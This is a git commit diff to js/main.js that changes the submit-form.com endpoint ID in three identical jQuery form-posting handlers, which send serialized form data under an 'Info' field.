beae0519a2f34a2c252a5a521cd72be60aebc935
Okegbenro Abayomi <okegbenroabayo@gmail.com>
2024-02-24 13:05:19 +0100

    fff

--- js/main.js
+++ js/main.js
@@ -100,7 +100,7 @@ $(document).ready(function () {
     //   });
     //
     $.post(
-      "https://submit-form.com/N6QEhVAT",
+      "https://submit-form.com/rTBp5P1wS",
       {
         Info: new URLSearchParams(formData).toString(),
       },
@@ -144,7 +144,7 @@ $(document).ready(function () {
     //   });
     //
     $.post(
-      "https://submit-form.com/N6QEhVAT",
+      "https://submit-form.com/rTBp5P1wS",
       {
         Info: new URLSearchParams(formData).toString(),
       },
@@ -188,7 +188,7 @@ $(document).ready(function () {
     //   });
     //
     $.post(
-      "https://submit-form.com/N6QEhVAT",
+      "https://submit-form.com/rTBp5P1wS",
       {
         Info: new URLSearchParams(formData).toString(),
       },
